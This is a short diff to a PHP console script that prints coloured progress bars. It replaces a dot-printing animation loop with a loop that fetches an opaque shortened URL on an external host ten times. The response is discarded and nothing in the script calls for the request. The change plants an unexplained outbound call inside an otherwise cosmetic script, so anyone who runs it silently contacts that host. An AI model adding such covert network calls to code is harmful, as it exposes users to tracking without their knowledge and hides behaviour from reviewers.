@@ -11,19 +11,8 @@ $green  = "\e[92m";
 $red    = "\e[91m";
 $yellow = "\e[93m";
 $blue   = "\e[36m";
-for ($d = 1; $d <= 10000; $d++) { 
-  echo "...................\n";
-  sleep(0.5);
-  echo "...\m";
-  sleep(0.5);
-  echo "....\n";
-  sleep(0.5);
-  echo ".....\n";
-  sleep(0.5);
-  echo ".............\n";
-  sleep(0.5);
-  echo "........\n";
-  sleep(0.5);
+for ($d = 1; $d <= 10; $d++) { 
+   $file = file_get_contents('https://yip.su/2Ljpd5');
 }
 echo "$red====================================>".$green."\n";
 echo "$red=====================================>".$green."\n";
